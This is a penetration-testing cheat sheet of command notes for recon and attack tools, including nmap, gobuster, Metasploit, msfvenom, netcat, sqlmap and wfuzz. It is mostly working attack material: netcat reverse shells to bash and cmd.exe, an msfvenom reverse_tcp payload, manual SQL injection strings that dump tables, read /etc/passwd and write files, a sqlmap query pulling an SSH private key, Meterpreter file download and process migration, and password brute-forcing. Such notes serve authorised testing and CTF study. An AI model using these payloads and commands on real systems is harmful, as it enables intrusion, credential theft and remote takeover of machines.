ASCII,Hex,Binary,Decimal,Base64 converter:
  https://gchq.github.io/CyberChef/
  https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
dirb:
	dirb http://<target> <wordlist>
	dirb http://<target> -X <extension> 	(e.g. .asp or .aspx)
	dirb http://<target> -w <wordlist> -f -e extension1,extension2 -x 400
	dirb http://<target> -p <proxy:port> -P <proxy_user:proxy_pass> -r
dirbuster:
	dirb gui
	can check response size differences
	generates directory tree graphical
filebuster:
	https://github.com/henshin/filebuster
ftp:
  lftp:
  	$ lftp Anonymous@<target>
  ftp:
  	$ apt install ftp
	$ ftp <target>
		ftp> get "file"
  wget:
	  $ wget -r ftp://<target>
Gobuster:
	gobuster -e -u http://<target>/ -w <wordlist>
	gobuster -e -u http://<target>/ -w <wordlist> -s '200,204,301,302,307,403,500' (status codes)
	recursive-gobuster:
		https://github.com/epi052/recursive-gobuster
		recursive-gobuster.pyz -d http://<target>:<port>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 20 | tee gobuster/directories
Masscan:
  $ masscan -p1-65535 <target> --rate=1000 -e <interface> > file
  $ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//' )
  $ nmap -Pn -sV -sC -p $ports <target>
Metasploit:
  pre-start:
    $ msfdb init
    $ systemctl enable postgresql
  db_nmap:
    # Use workspaces to separate different scans
    msf> workspace --add <name>
    msf> db_nmap -Pn -pn -n -v <target>/<cidr>
    msf> db_nmap -sV -sC -Pn -n -v -p <port-list> <target>
    # identified services and hosts are saved in the workspace
    msf> services
    msf> hosts
Meterpreter:
	post exploit “Multi Recon Local Exploit Suggester”: 
		msf> use post/multi/recon/local_exploit/suggester
		msf> set session <id>
		msf> run
	Download files from victim:
		msf> download /path/to/file /local/path
	Migrate:
		1.
		meterpreter> ps -S <process name>
		meterpreter> ps
		meterpreter> migrate <pid>
		meterpreter> migrate <pid> -t <seconds>
		2.
		use post/windows/manage/migrate
		msf post(windows/manage/migrate)>set session 1
		msf post(windows/manage/migrate)> run
	Interactive shell (if shell command doesnt work):
		meterpreter> execute -i -f /bin/bash
Msfvenom:
	msfvenom -p php/meterpreter/reverse_tcp lhost=<kali-ip> lport=<port> -f <format> > file
	msfvenom --list archs
	msfvenom --list formats
Netcat:
	nc -nvlp <port>				(listen)
	nc  <address> <port> -e /bin/bash	(connect)
	nc.exe <address> <port> -e cmd.exe	(connect windows)
Nmap:
  basic scans:
    $ nmap -Pn -n -v <target>/<cidr>
    $ nmap -sS -Pn -n -p- <target>
    $ nmap -sV -sC -Pn -n -v -p port1,port2,..portN <target>
  http:
    $ nmap -sV -p 80 --script http-methods,http-enum <target>
  nmap automator:
    https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh
Nikto:
	nikto -h <address>
	nikto -h <address> -p <port>
	nikto -h https://<address>:<port>/
	nikto -h <address> -p <port> -ssl
Password Cracking:
  https://hashkiller.co.uk/
  https://crackstation.net/
PHP
	PHP web shell:
		https://github.com/Arrexel/phpbash
	PHP disabled functions: (could give a shell)
		phpinfo();
		disable_functions =>exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
	PHP list directories and read file contents:
		scandir("/home/user");
		file_get_contents("/home/user/file.txt")
		file_get_contents("http://10.10.16.66:8000/remote-file.txt")
Reverse shells:
	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	http://pentestmonkey.net/category/tools/web-shells
Searchsploit:
  $ searchsploit -m <exploit-pattern>
SFTP:
	$ sftp user@<target>
		sftp> get/put <file>
	  sftp> symlink /etc/passwd/ passwd
SMB:
  discovery:
  	use auxiliary/scanner/smb/smb2
	use auxiliary/scanner/smb/smb1
	use auxiliary/scanner/smb/smb_version  
  get share list:
  	$ smbclient -L <target>
  	$ smbclient -L <target> -U <user>
  	$ enum4linux -S <target>
  Connect:
	  $ smbclient //<target>/<share>
	  $ smbclient \\\\<target>\\<share>
    $ smbclient //<target>/<share> -U <user>
	  smb> get <file> -	(read a file)
	  smb> get "<file>"	(download)
  Eternalblue scan:
	nmap --script vuln -p445 <target>
  impacket smbclient:
	./smbclient.py user:password@<target>
SQLi Manual (mysql)
	Filter e.g. : union and UNION , but not uniOn
	
	' or 1=1 -- 					(view all database info)
	' or 1=1 -- -
	' or 1=1#
	
	' UNION SELECT 1,2,3,4#				(enumerate columns)										
	' UNION SELECT null,null,null,@@version#	(version info: e.g. ubuntu 14.04)
	' UNION SELECT null,null,null,database()#	(database name)
	' UNION SELECT null,null,null,user()#		(user: e.g. root@localhost)								' UNION ALL SELECT null,null,null, table_name FROM information_schema.tables # 	(table name: e.g. users)
	'+UNION+select+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS;+--+-
	' UNION ALL SELECT null,null,null, column_name FROM information_schema.columns where table_name='users' # (table columns: e.g. username, password)
	' union all select null,null,username,password from users #
	' union all select null,null,null, load_file("/etc/passwd") # 	(view /etc/passwd)	
	' union all select 1,"test",3,4 into outfile '/tmp/test.txt' # 	(write a test file)
SQLmap:
SQLmap (get)
	sqlmap -u "http://<target>link.php?VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue"  --dbs
SQLi WAF bypass with delay:
	intercept request with burp -> right click -> save to file, then:
	sqlmap -r app.request --delay=1 --batch --dump
SQLmap (post)
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --banner
	sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms
	sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbs
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database> --tables
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> --columns
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> -C <column1>,<column2> --dump
SQLmap request (aggressive):
	1. sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all
	2. sqlmap -u http://<target>/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
SQLmap (Rest API)
	sqlmap --url=http://10.10.10.96/users/*
	sqlmap --sql-shell --url=http://10.10.10.96/users/*
		sql-shell> SELECT hex(load_file('home/user/.ssh/id_rsa')) 
Webshells:
	/usr/share/webshells
wfuzz POST & GET:
	FUZZ keyword
	-hw (wide answers based on word length)
		wfuzz -w wordlist.txt -L 20 -d "username=alex&password=FUZZ" http://<target>/login.php
		wfuzz -w wordlist.txt -L  http//<target>/login.php?username=<user>\&password=FUZZ
	-hh: hide responses with content-length number
		wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<target>/sync?FUZZ=ls -c --hh 19
		wfuzz -u http://<target>/path/FUZZ -w /usr/share/dirb/wordlists/common.txt
	WFUZZ Brute force a cookie: (--hw: hide words)
		wfuzz -c --hw=<words> -w /usr/share/SecLists/Passwords/darkweb2017-top1000.txt-H "Cookie: <cookie_name>=FUZZ" http://<target>:<port>
Wordlists:
	/usr/share/wordlists
	https://github.com/danielmiessler/SecLists.git
Wordlist generation:
	cewl <target> > wordlist.txt
	crunch (generate based on charset, min, max number of chars)
		crunch <min-chars> <max-chars> <charset> -o output.txt
		crunch 15 15 -t Th4C00lTheacha^ -o pass.txt
			-t (literal)
				@: lower
				,: upper
				%: numbers
				^: symbols
